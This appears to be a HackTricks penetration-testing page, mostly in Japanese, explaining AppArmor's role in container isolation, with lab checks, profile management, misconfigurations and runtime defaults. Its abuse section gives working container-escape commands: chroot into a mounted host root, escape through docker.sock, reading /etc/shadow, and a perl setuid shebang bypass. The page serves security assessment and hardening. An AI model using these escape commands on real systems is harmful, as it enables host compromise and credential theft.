# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

AppArmorは、プログラムごとのプロファイルを通じて制限を適用する**Mandatory Access Control**システムです。ユーザやグループ所有権に大きく依存する従来のDACチェックとは異なり、AppArmorはカーネルがプロセス自体に紐づいたポリシーを強制します。コンテナ環境では、ワークロードが従来の権限である操作を試みるのに十分でも、AppArmorプロファイルが該当するパス、mount、ネットワークの振る舞い、またはcapabilityの使用を許可していないために拒否されることがあるため、これは重要です。

最も重要な概念的ポイントは、AppArmorが**path-based**であることです。SELinuxのようにラベルではなくパスルールを通じてファイルシステムアクセスを評価します。これにより扱いやすく強力になりますが、同時にbind mountsや代替パスレイアウトに注意を払う必要があることを意味します。同じホスト上のコンテンツが別のパスで到達可能になると、ポリシーの効果は運用者が最初に想定したものとは異なる場合があります。

## コンテナ分離における役割

コンテナのセキュリティレビューはしばしばcapabilitiesやseccompで止まりますが、AppArmorはそれらのチェック後も重要です。コンテナが本来より多くの権限を持っている場合や、運用上の理由でひとつ余計なcapabilityが必要だったワークロードを想定してください。AppArmorはそれでもファイルアクセス、mountの挙動、ネットワーキング、実行パターンを制約して、明白な悪用経路を阻止できます。だからこそ、AppArmorを「アプリを動かすためだけに」無効にすることは、単に危険な設定を積極的に悪用可能な状態に変えてしまう可能性があります。

## ラボ

ホストでAppArmorが有効かどうかを確認するには、次を使用します:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
現在のコンテナプロセスがどのユーザー／コンテキストで実行されているかを確認するには:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
この違いは示唆に富んでいます。通常の場合、プロセスはランタイムによって選択されたプロファイルに紐づく AppArmor コンテキストを表示するはずです。unconfined の場合、その追加の制限レイヤーは消えます。

また、Docker が適用したと思っているものを確認することもできます:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Runtime Usage

ホストが対応している場合、Docker はデフォルトまたはカスタムの AppArmor プロファイルを適用できます。Podman も AppArmor ベースのシステムで AppArmor を統合できますが、SELinux を優先するディストリビューションではそちらが主役になることが多いです。Kubernetes は、AppArmor を実際にサポートするノード上でワークロード単位の AppArmor ポリシーを公開できます。LXC や Ubuntu 系の system-container 環境でも AppArmor が広く使われます。

実務上のポイントは、AppArmor は「Docker の機能」ではないということです。これはホストカーネルの機能で、複数のランタイムが任意に適用できます。ホストが対応していないか、ランタイムが unconfined として実行するよう指示されていると、本来期待される保護は実質的に存在しません。

Docker 対応の AppArmor ホストでは、最も知られているデフォルトが `docker-default` です。このプロファイルは Moby の AppArmor テンプレートから生成されており、ある種の capability ベースの PoC がデフォルトのコンテナで失敗する理由を説明してくれるため重要です。大まかに言えば、`docker-default` は通常のネットワーキングを許可し、`/proc` の多くへの書き込みを拒否し、`/sys` の敏感な部分へのアクセスを拒否し、マウント操作をブロックし、ptrace を制限してそれが汎用のホスト探索プリミティブにならないようにします。そのベースラインを理解することで、「コンテナは `CAP_SYS_ADMIN` を持っている」という状態と「コンテナが実際にその capability を対象のカーネルインターフェースに対して使用できる」という状態を区別できます。

## Profile Management

AppArmor のプロファイルは通常 `/etc/apparmor.d/` 以下に保存されます。一般的な命名規則では、実行ファイルのパス中のスラッシュをドットに置き換えます。例えば、`/usr/bin/man` 用のプロファイルは一般に `/etc/apparmor.d/usr.bin.man` として保存されます。この仕様は防御と評価の両方で重要で、アクティブなプロファイル名が分かれば、ホスト上で対応するファイルを素早く見つけられることが多いからです。

有用なホスト側の管理コマンドには以下があります：
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
これらのコマンドがコンテナセキュリティのリファレンスで重要なのは、プロファイルが実際にどのように構築され、読み込まれ、complain mode に切り替えられ、アプリケーションの変更後にどのように修正されるかを説明するからです。オペレータがトラブルシューティングの際にプロファイルを complain mode に移して enforcement を復元するのを忘れる癖があると、ドキュメント上ではコンテナが保護されているように見えても、実際にはずっと緩い挙動を示す可能性があります。

### プロファイルの生成と更新

`aa-genprof` はアプリケーションの動作を観察し、対話的にプロファイルの生成を支援します:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` はテンプレートプロファイルを生成でき、後で `apparmor_parser` で読み込むことができます:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
バイナリが変更されポリシーの更新が必要な場合、`aa-logprof` はログで見つかった拒否を再生して、オペレーターがそれらを許可するか拒否するかを判断するのを支援できます:
```bash
sudo aa-logprof
```
### ログ

AppArmor の拒否は多くの場合 `auditd`、syslog、または `aa-notify` のようなツールで確認できます:
```bash
sudo aa-notify -s 1 -v
```
これは運用面および攻撃面の両方で有用です。防御側はプロファイルを改善するために利用し、攻撃者はどの正確なパスや操作が拒否されているか、またAppArmorがexploit chainを阻止している制御なのかを把握するために利用します。

### 正確なプロファイルファイルの特定

ランタイムがcontainerに対して特定のAppArmorプロファイル名を表示する場合、その名前をディスク上のプロファイルファイルに対応付けることがしばしば有用です:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
これはホスト側でのレビュー時に特に有用です。コンテナがプロファイル `lowpriv` の下で動作していると言っている状態と、実際のルールが監査やリロード可能な特定のファイルに格納されているという事実との間のギャップを埋めます。

## 設定ミス

もっとも明白なミスは `apparmor=unconfined` です。管理者は、profile が危険または予期しない何かを正しくブロックしたためにアプリケーションが失敗した際、デバッグのためにこれを設定することがよくあります。このフラグが本番環境に残っていると、MAC レイヤー全体が実質的に無効化されます。

別の微妙な問題は、ファイルのパーミッションが普通に見えるために bind mounts が無害だと想定することです。AppArmor はパスベースで動作するため、ホストのパスを別のマウント場所下に露出させるとパスルールと悪く相互作用する可能性があります。三つ目のミスは、設定ファイルにある profile 名が、ホストカーネルが実際に AppArmor を強制していない場合にはほとんど意味を持たないことを忘れることです。

## 悪用

AppArmor が無効になると、以前は制限されていた操作が突然可能になることがあります：bind mounts 経由での機密パスの読み取り、通常は利用しにくいはずの procfs や sysfs の一部へのアクセス、capabilities/seccomp が許可していればマウント関連の操作の実行、あるいは本来 profile が拒否するはずのパスの利用などです。AppArmor は、権限に基づくブレイクアウト試行が紙面上は「動作するはず」となっているのに実際には失敗する理由を説明することがよくあります。AppArmor を取り除くと、同じ試行が成功し始めるかもしれません。

もし AppArmor がパストラバーサル、bind-mount、またはマウントに基づく悪用チェーンを止めている主因だと疑うなら、最初のステップはプロファイルあり/なしでどこまでアクセス可能になるかを比較することです。例えば、ホストのパスがコンテナ内にマウントされている場合、まずそれを辿って読み取れるかどうかを確認します：
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
コンテナが `CAP_SYS_ADMIN` のような危険な権限を持っている場合、最も実用的なテストの一つは、AppArmor がマウント操作や機密性の高いカーネルのファイルシステムへのアクセスをブロックしている制御かどうかを確認することです：
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ホストパスが bind mount を通じて既に利用可能な環境では、AppArmor を失うことで、read-only information-disclosure issue が直接ホストファイルへのアクセスに変わることがあります:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
これらのコマンドの要点は、AppArmor だけが breakout を引き起こすということではありません。AppArmor が削除されると、ファイルシステムやマウントに基づく多くの悪用経路が即座に検証可能になる、という点です。

### 完全な例: AppArmor 無効化 + ホストルートがマウントされている場合

コンテナにすでにホストのルートが `/host` にバインドマウントされている場合、AppArmor を削除すると、阻止されていたファイルシステムの悪用経路が完全な host escape に変わる可能性があります:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
一度 shell が host filesystem を通じて実行されると、その workload は実質的に container boundary を脱出したことになります:
```bash
id
hostname
cat /etc/shadow | head
```
### 完全な例: AppArmor が無効 + Runtime Socket

もし実際の障壁が runtime state を保護する AppArmor だった場合、マウントされた socket が完全な escape に十分になることがある:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
正確なパスはマウントポイントに依存しますが、結果は同じです: AppArmor はもはや runtime API へのアクセスを防いでおらず、runtime API はホストを侵害する container を起動できます。

### 完全な例: Path-Based Bind-Mount Bypass

AppArmor はパスベースであるため、`/proc/**` を保護しても、同じホストの procfs コンテンツが別のパスから到達可能な場合は自動的に保護されません:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
影響は具体的に何がマウントされているか、および代替パスが他の制御もバイパスするかどうかによるが、このパターンはAppArmorを単独で評価するのではなく、マウント配置と合わせて評価しなければならない最も明白な理由の一つである。

### 完全な例: Shebang Bypass

AppArmor ポリシーは、shebang 処理を介した script の実行を完全に考慮せずに interpreter のパスをターゲットにすることがある。歴史的な例では、最初の行が制限された interpreter を指す script を使用することが含まれていた:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
この種の例は、プロファイルの意図（profile intent）と実際の実行セマンティクス（execution semantics）が乖離し得ることを思い出させる重要なものです。AppArmor を container 環境で確認する際は、インタプリタチェーン（interpreter chains）や代替の実行経路に特に注意を払うべきです。

## Checks

これらのチェックの目的は、迅速に3つの質問に答えることです: ホストで AppArmor が有効か、現在のプロセスが制限されているか、そして runtime が実際にこの container にプロファイルを適用したか。
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応ホストではデフォルトで有効 | オーバーライドがなければ `docker-default` AppArmor プロファイルを使用する | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | ホスト依存 | `--security-opt` 経由で AppArmor をサポートするが、正確なデフォルトはホスト/ランタイム依存で、Docker のドキュメント化された `docker-default` プロファイルほど普遍的ではない | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 条件付きデフォルト | `appArmorProfile.type` が指定されていない場合、デフォルトは `RuntimeDefault` だが、ノードで AppArmor が有効な場合にのみ適用される | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost`（弱いプロファイルと組み合わせる）、AppArmor 非対応ノード |
| containerd / CRI-O under Kubernetes | ノード/ランタイムのサポートに従う | 多くの Kubernetes 対応ランタイムは AppArmor をサポートするが、実際の強制はノードのサポートとワークロード設定に依存する | Kubernetes 行と同様；直接ランタイム設定で AppArmor を完全にスキップすることも可能 |

For AppArmor, the most important variable is often the **ホスト**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.
